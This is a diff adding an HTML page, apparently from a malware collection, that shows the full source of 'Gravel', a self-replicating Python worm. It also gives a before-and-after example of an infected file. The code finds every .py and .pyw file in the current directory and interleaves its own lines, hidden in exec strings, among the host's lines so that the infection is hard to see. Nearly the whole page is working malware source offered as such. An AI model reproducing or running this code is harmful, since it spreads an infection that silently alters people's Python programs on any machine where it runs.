@@ -1,0 +1,160 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html>
+<head>
+
+<link href="../../viewer/css/style2.css" rel="stylesheet" type="text/css">
+</head>
+
+<body>
+
+<div class="menu">
+<div class="menuitem"><a href="../../viewer/html/sources.html">Return to previous menu</a></div>
+<div class="menuitem"><a target="_blank" href="./gravel">Navigate to project folder</a></div>
+
+</div>
+
+<div class="title">Python.Gravel<br/></div>
+<div class="author">Mike_Hood<br/></div>
+
+
+<xmp>
+
+# Name  : Gravel
+# Type  : Oligomorphic Python worm
+# Author: Mike_Hood
+
+# Description: Gravel searches for python files in the current directory, analyzes their
+#              code and create a list of all lines that must be executed and that are not
+#              simple comments or commands wich modify the flow of the program. Using this
+#              list the worm simply writes its lines in specific areas of the victim's code
+#              so that neither Gravel's code nor victim's code get corrupted.
+
+# Thanks to: WarGame, girls and music.
+
+# Gravel #########################################################
+
+VirusLines=[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24]
+import glob, sys
+from string import *
+MySelf=open(sys.argv[0])
+MyCode=MySelf.readlines()
+MySelf.close()
+VirusCode=[]
+exec("for i in range(0,len(VirusLines),1):\n\tVirusCode.append(MyCode[VirusLines[i]])")
+VirusCode.append("#GRAVEL\n")
+Hostfiles=glob.glob("*.py")+glob.glob("*.pyw")
+slabolg=globals()
+exec "for Hostfiles in Hostfiles:\n\tfor z in range(12,len(VirusCode),1):\n\t\texec VirusCode[z] in slabolg" in slabolg
+source=open(Hostfiles,"rb")
+code=source.readlines()
+source.close()
+exec "if len(code)>0:\n\tif (code[len(code)-1][-1])!=chr(10):\n\t\tcode[len(code)-1]+=chr(10)" in slabolg
+GoodLines=[]
+exec "for i in range(0,len(code),1):\n\tline=code[i]\n\tif (\"\t\" in line)!=True and (\":\" in line)!=True and (\"#\"in line)!=True and line[0]!=chr(10):\n\t\tGoodLines+=[i]" in slabolg
+x=a=0
+InfectedCode=[]
+exec "for i in range(-1,len(code)-1,1):\n\tif ((i+1) in GoodLines)==1 and x<len(VirusLines)-1:\n\t\tInfectedCode.append(VirusCode[x])\n\t\tif x==0:\n\t\t\ta=i+x+1\n\t\tVirusLines[x]=i+x+1\n\t\tx+=1\n\t\tInfectedCode.append(code[i+1])\n\t\tInfectedCode.append(VirusCode[x])\n\t\tVirusLines[x]=i+x+2\n\t\tx+=1\n\telse:\n\t\tInfectedCode.append(code[i+1])" in slabolg
+exec "if(x<len(VirusLines)):\n\tif len(code)==0:\n\t\ti=-2\n\tfor x in range(x,len(VirusLines),1):\n\t\tInfectedCode.append(VirusCode[x])\n\t\tif x==0:\n\t\t\ta=i+x+2\n\t\tVirusLines[x]=i+x+2" in slabolg
+InfectedCode[a]="VirusLines="+str(VirusLines)+"\n"
+exec "if find(str(code),\"GRAVEL\")==-1:\n\txls=open(Hostfiles,\"wb\")\n\tfor i in range(0,len(InfectedCode),1):\n\t\txls.write(InfectedCode[i])\n\txls.close()" in slabolg
+#GRAVEL
+
+# End of code ####################################################
+
+# Infection Example ###############################################
+
+# Example code before infection #####################################
+
+# Example code
+# This is an example code
+# to show how Gravel works
+
+print("Hello")
+print("Hello")
+print("Hello")
+
+hello="Hello"
+
+def Hello():
+	print("Hello")
+	while hello=="Hello":
+		print("Hello")
+		hello="hello"
+	
+print("Hello")
+if hello=="Hello":
+	print("Hello")
+else:
+	print("Hello")
+	
+print ("Hello")
+
+for i in range(0,15,1):
+	print("Hello")
+	
+print("Hello")
+
+# Example code after infection #######################################
+
+# Example code
+# This is an example code
+# to show how Gravel works
+VirusLines=[3, 5, 6, 8, 9, 11, 12, 14, 15, 17, 18, 20, 21, 23, 30, 32, 38, 40, 41, 43, 47, 49, 50, 51, 52]
+
+import glob, sys
+from string import *
+print("Hello")
+MySelf=open(sys.argv[0])
+MyCode=MySelf.readlines()
+print("Hello")
+MySelf.close()
+VirusCode=[]
+print("Hello")
+exec("for i in range(0,len(VirusLines),1):\n\tVirusCode.append(MyCode[VirusLines[i]])")
+VirusCode.append("#GRAVEL\n")
+
+Hostfiles=glob.glob("*.py")+glob.glob("*.pyw")
+slabolg=globals()
+hello="Hello"
+exec "for Hostfiles in Hostfiles:\n\tfor z in range(12,len(VirusCode),1):\n\t\texec VirusCode[z] in slabolg" in slabolg
+source=open(Hostfiles,"rb")
+
+code=source.readlines()
+def Hello():
+	print("Hello")
+	while hello=="Hello":
+		print("Hello")
+		hello="hello"
+	
+source.close()
+print("Hello")
+exec "if len(code)>0:\n\tif (code[len(code)-1][-1])!=chr(10):\n\t\tcode[len(code)-1]+=chr(10)" in slabolg
+if hello=="Hello":
+	print("Hello")
+else:
+	print("Hello")
+	
+GoodLines=[]
+print ("Hello")
+exec "for i in range(0,len(code),1):\n\tline=code[i]\n\tif (\"\t\" in line)!=True and (\":\" in line)!=True and (\"#\"in line)!=True and line[0]!=chr(10):\n\t\tGoodLines+=[i]" in slabolg
+x=a=0
+
+InfectedCode=[]
+for i in range(0,15,1):
+	print("Hello")
+	
+exec "for i in range(-1,len(code)-1,1):\n\tif ((i+1) in GoodLines)==1 and x<len(VirusLines)-1:\n\t\tInfectedCode.append(VirusCode[x])\n\t\tif x==0:\n\t\t\ta=i+x+1\n\t\tVirusLines[x]=i+x+1\n\t\tx+=1\n\t\tInfectedCode.append(code[i+1])\n\t\tInfectedCode.append(VirusCode[x])\n\t\tVirusLines[x]=i+x+2\n\t\tx+=1\n\telse:\n\t\tInfectedCode.append(code[i+1])" in slabolg
+print("Hello")
+exec "if(x<len(VirusLines)):\n\tif len(code)==0:\n\t\ti=-2\n\tfor x in range(x,len(VirusLines),1):\n\t\tInfectedCode.append(VirusCode[x])\n\t\tif x==0:\n\t\t\ta=i+x+2\n\t\tVirusLines[x]=i+x+2" in slabolg
+InfectedCode[a]="VirusLines="+str(VirusLines)+"\n"
+exec "if find(str(code),\"GRAVEL\")==-1:\n\txls=open(Hostfiles,\"wb\")\n\tfor i in range(0,len(InfectedCode),1):\n\t\txls.write(InfectedCode[i])\n\txls.close()" in slabolg
+#GRAVEL
+
+# End ###########################################################
+
+</xmp>
+</div>
+
+</body>
+</html>
